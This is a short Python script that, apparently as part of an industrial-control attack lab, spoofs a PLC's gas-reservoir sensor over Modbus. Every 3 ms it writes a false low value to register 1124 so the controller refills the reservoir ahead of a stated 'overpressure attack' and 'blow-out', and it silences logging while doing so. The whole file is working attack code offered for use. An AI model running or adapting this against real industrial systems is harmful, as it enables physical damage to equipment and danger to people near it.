#!/usr/bin/env python3
"""
Pre-charge the gas reservoir (GST) before the overpressure attack.

The blow-out needs the reservoir well-stocked so the compressor never runs dry
during the climb. Writing a LOW value to the GST sensor (register 1124) makes
the controller open the supply valve and refill the reservoir; the compressor
stays idle (it will not compress from an apparently-empty reservoir), so the
high-pressure tank stays at its normal level while GST fills up.

Usage: gst_precharge.py [PLC_IP] [SECONDS]
"""
import sys, time, logging
from pymodbus.client import ModbusTcpClient
for _n in ('pymodbus', 'pymodbus.logging', 'pymodbus.transaction'):
    logging.getLogger(_n).setLevel(logging.CRITICAL)
logging.disable(logging.ERROR)

IP = sys.argv[1] if len(sys.argv) > 1 else "172.18.0.3"
SECONDS = float(sys.argv[2]) if len(sys.argv) > 2 else 100.0

c = ModbusTcpClient(IP, port=502); c.connect()
t0 = time.time()
while time.time() - t0 < SECONDS:
    try:
        c.write_register(1124, 10)
    except Exception:
        try: c.connect()
        except Exception: pass
    time.sleep(0.003)
c.close()
print(f"pre-charge done ({int(SECONDS)}s)")
